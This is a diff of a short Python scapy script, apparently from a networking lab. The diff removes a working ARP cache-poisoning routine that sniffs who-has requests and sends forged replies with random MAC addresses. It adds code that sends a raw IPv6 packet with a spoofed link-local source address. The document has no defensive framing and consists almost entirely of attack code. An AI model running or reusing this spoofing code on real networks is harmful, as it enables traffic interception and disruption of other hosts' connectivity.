@@ -1,24 +1,20 @@
 from scapy.all import *
+import time
 
-def rand_mac():
-    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(0, 255)
-        )
+dest = "fe80::1234"
 
-def arp_monitor_callback(pkt):
-    print(pkt.psrc) # 192.168.0.1
-    print(pkt.pdst) # 192.168.0.106
-    print(pkt.hwsrc) # 08:00:27:17:0c:f0
-    asking_ip = pkt.pdst
-    server_ip = pkt.psrc
-    false_mac = rand_mac()
-    if ARP in pkt and pkt[ARP].op == 1: #who-has
-        malicious_pkt = ARP(op=2, pdst = server_ip, hwsrc = false_mac, psrc = asking_ip)
-        send(malicious_pkt)
+base = IPv6()
+base.dst = dest
+base.src = "fe80::dead:beef"
+# ns = ICMPv6ND_NS(tgt=dest)
+# ll = ICMPv6NDOptSrcLLAddr()
 
-sniff(iface="enp0s8", prn=arp_monitor_callback, filter="arp", store=0)
+ether = Ether()
+
+pkt = ether / base
+
+
+
+print(pkt)
+pkt.show2()
+sendp(pkt, iface="enp0s8")
